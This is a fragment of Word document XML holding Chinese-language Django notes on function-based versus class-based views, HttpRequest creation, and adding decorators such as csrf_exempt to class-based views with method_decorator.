    <w:p w14:paraId="62CED39E" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33994338" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    @method_decoretor(装饰器函数)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19B487A0" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    def get(self,request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DC3B528" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">        pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18098392" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="400928D1" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    def post(self,request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A6FBD48" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">        pass </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C34A82E" w14:textId="16E5DBD6" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>路由：IndexView.as_view()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B24C593" w14:textId="4AC5B44E"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025</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FBV</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>与</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>CBV</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>的区别</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CBC8293" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>- 没什么区别，因为他们的本质都是函数。CBV的.as_view()返回的view函数，view函数中调用类的dispatch方法，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46EA2A01" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>在dispatch方法中通过反射执行get/post/delete/put等方法。D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="205A31B8" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F323304" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>非要说区别的话：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03DBEBC3" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>- CBV比较简洁，GET/POST等业务功能分别放在不同get/post函数中。FBV自己做判断进行区分。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26F03A02" w14:textId="0C46F2E4"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026</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的</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>request</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>对象是在什么时候创建的？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="361D6D47" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">当请求一个页面时, Django会建立一个包含请求元数据的 HttpRequest 对象. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75DDF867" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">当Django 加载对应的视图时, HttpRequest对象将作为视图函数的第一个参数. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68EE31F8" w14:textId="21F60301" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>每个视图会返回一个HttpResponse对象.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="484D0C97" w14:textId="5F36850F"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027</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如何给</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>CBV</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>的程序添加装饰器？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EE8CB9B" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>添加装饰器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53D7CF7A" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>方式一：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="193F50D1" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>from django.views import View</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D0C1F12" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>from django.utils.decorators import method_decorator  ---&gt; 需要引入memethod_decorator</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4510B168" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C72C1A4" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>def auth(func):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="497B88C5" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    def inner(*args,**kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="233ABF64" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">        return func(*args,**kwargs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FCD204B" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    return inner</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B5CA33B" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4BEEDAEF" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>class UserView(View):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2551EE20" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    @method_decorator(auth)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5328F94C" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    def get(self,request,*args,**kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65F0B0DF" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">        return HttpResponse('...')    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DBE5A2A" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A95E076" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>方式二：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12D0FB97" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>- csrf的装饰器要加到dispath前面</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="765098D5" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>from django.views import View</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D042070" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>from django.utils.decorators import method_decorator</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="725D224E" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>from django.views.decorators.csrf import csrf_exempt,csrf_protect   ---&gt; 需要引入 csrf_exempt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="069E96E3" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D0F4920" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>class UserView(View):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E750F1E" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    @method_decorator(csrf_exempt)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BD1B81C" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    def dispatch(self, request, *args, **kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0790C538" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">        return HttpResponse('...')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57EAADEA" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="611EC92A" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>或者：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75184452" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>from django.views import View</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F01E57D" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>from django.utils.decorators import method_decorator</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46CDD53C" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>from django.views.decorators.csrf import csrf_exempt,csrf_protect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="617A3D0E" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="29852F42" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>@method_decorator(csrf_exempt,name='dispatch')  ---&gt;  指定名字</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7572C367" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
